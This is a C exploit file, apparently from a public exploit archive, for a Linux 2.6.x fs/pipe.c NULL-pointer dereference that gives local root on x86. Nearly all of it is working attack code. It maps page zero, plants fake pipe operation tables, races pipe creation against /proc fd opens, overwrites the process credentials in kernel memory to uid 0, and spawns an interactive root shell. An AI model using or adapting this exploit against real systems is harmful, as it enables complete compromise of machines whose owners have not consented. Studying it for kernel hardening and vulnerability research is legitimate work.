/*
source: https://www.securityfocus.com/bid/36901/info

Linux kernel is prone to a local privilege-escalation vulnerability that is caused by a NULL-pointer dereference.

Local attackers can exploit this issue to execute arbitrary code with kernel-level privileges. Successful exploits will result in the complete compromise of affected computers. Failed exploit attempts will result in a denial-of-service condition.
*/

/******************************************************************************
 *                            .:: Impel Down ::.
 *
 *     Linux 2.6.x fs/pipe.c local kernel root(kit?) exploit (x86)
 *                              by teach & xipe
 *    Greetz goes to all our mates from #nibbles, #oldschool and #carib0u
 *    (hehe guyz, we would probably be high profile and mediatised el8 if we
 *    lost less time on trolling all day long, but we LOVE IT :)))
 *    Special thanks to Ivanlef0u, j0rn & pouik for being such amazing (but i
 *    promise ivan, one day i'll kill u :p)
 *
 * (C) COPYRIGHT teach & xipe, 2009
 * All Rights Reserved
 *
 * teach@vxhell.org
 * xipe@vxhell.org
 *
 *******************************************************************************/

#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/mman.h>
#include <syscall.h>
#include <stdint.h>

#define PIPE_BUFFERS (16)

struct pipe_buf_operations {
        int can_merge;
	int *ops[10];
};

struct pipe_buffer {
        int *page;
        unsigned int offset, len;
        const struct pipe_buf_operations *ops;
        unsigned int flags;
        unsigned long private;
};

struct pseudo_pipe_inode_info
{
	/* Wait queue head */
 		/* spinlock */
		int spinlock;
		/* list */
		int *next, *prev;
	unsigned int nrbufs, curbuf;
	int *page;
	unsigned int readers;
	unsigned int writers;
	unsigned int waiting_writers;
	unsigned int r_counter;
	unsigned int w_counter;
	int *async_readers;
	int *async_writers;
	int *inode;
	struct pipe_buffer bufs[PIPE_BUFFERS];
};

static pid_t uid;
static gid_t gid;
unsigned long taskstruct[1024];

static inline void *get_stack_top()
{
	void *stack;

	__asm__ __volatile__ (
	"movl $0xffffe000,%%eax ;"
	"andl %%esp, %%eax ;"
	"movl %%eax, %0 ;"
	: "=r" (stack)
	);
	return stack;
}

static inline void *get_current()
{
	return *(void **)get_stack_top();
}

static void update_cred()
{
	uint32_t	i;
	uint32_t	*task = get_current(); /* Pointer to the task_struct */
	uint32_t 	*cred = 0;

	for (i = 0; i < 1024; i++)
	{
		taskstruct[i] = task[i];
		cred = (uint32_t *)task[i];
		if (cred == (uint32_t *)task[i+1] && cred > (uint32_t *)0xc0000000) {
			cred++; /* Get ride of the cred's 'usage' field */
	        	if (cred[0] == uid && cred[1] == gid
		            && cred[2] == uid && cred[3] == gid
		            && cred[4] == uid && cred[5] == gid
		            && cred[6] == uid && cred[7] == gid)
		        {
				/* Get root */
		         	cred[0] = cred[2] = cred[4] = cred[6] = 0;
		                cred[1] = cred[3] = cred[5] = cred[7] = 0;
				break;
		        }
		}
	}
}

int is_done(int new)
{
	static int done = 0;
	if (done == 1)
		return (1);
	done = new;
}

volatile int done = 0;
void	kernel_code()
{
	is_done(1);
	update_cred();
	//exit_kernel();
}

int main(int ac, char **av)
{
	int fd[2];
	int pid;
	int parent_pid = getpid();
	char *buf;
	int i,j;
	struct pseudo_pipe_inode_info 	*pinfo = 0;
	struct pipe_buf_operations	ops;

	buf = mmap(0, 0x1000, PROT_READ | PROT_EXEC | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, 0, 0);

	printf ("buf: %p\n", buf);

	pinfo->readers = 0;
	pinfo->writers = 0;

	for (i = 0; i < 10; i++)
		ops.ops[i] = (int *)kernel_code;

	for (i = 0; i < PIPE_BUFFERS; i++)
	{
		pinfo->bufs[i].ops = &ops;
	}

	i = 0;


	uid = getuid();
	gid = getgid();
	setresuid(uid, uid, uid);
	setresgid(gid, gid, gid);
	//while (1)
	{
		pid = fork();
		if (pid == -1)
		{
			perror("fork");
			return (-1);
		}
		if (pid)
		{
			char path[1024];
			char c;
			/* I assume next opened fd will be 4 */
			sprintf(path, "/proc/%d/fd/4", pid);
		        printf("Parent: %d\nChild: %d\n", parent_pid, pid);
			while (!is_done(0))
			{
				fd[0] = open(path, O_RDWR);
				if (fd[0] != -1)
				{
					close(fd[0]);
				}
			}
			//system("/bin/sh");
			execl("/bin/sh", "/bin/sh", "-i", NULL);
			return (0);
		}

		while (!is_done(0))
		{
			if (pipe(fd) != -1)
			{
				close(fd[0]);
				close(fd[1]);
			}
		}
	}
}